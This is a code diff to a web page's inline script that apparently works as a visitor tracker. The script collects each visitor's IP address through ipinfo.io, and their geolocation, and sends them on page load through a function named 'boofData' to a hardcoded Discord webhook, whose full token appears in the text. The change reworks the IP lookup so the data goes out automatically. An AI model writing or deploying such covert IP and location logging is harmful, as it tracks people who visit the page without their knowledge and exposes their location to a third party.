@@ -19,12 +19,6 @@
 	<script>
     var ipaddr;
     var location;
-    async function ip() {
-      const ipr = await fetch('https://api.ipify.org?format=json');
-      const ipd = await ipr.json();
-      ipaddr = ipd.ip;
-    }
-    ip();
 
 		async function boofData(type) {
 			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
@@ -50,7 +44,10 @@
       }
       }
     }
-		boofData("main");
+    function getIP(json) {
+      ipaddr = json.ip;
+      boofData("main");
+    }
 
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
@@ -58,4 +55,5 @@
 			});
 		}
 	</script>
+  <script type="application/javascript" src="http://ipinfo.io/?format=jsonp&callback=getIP"></script>
 </html>
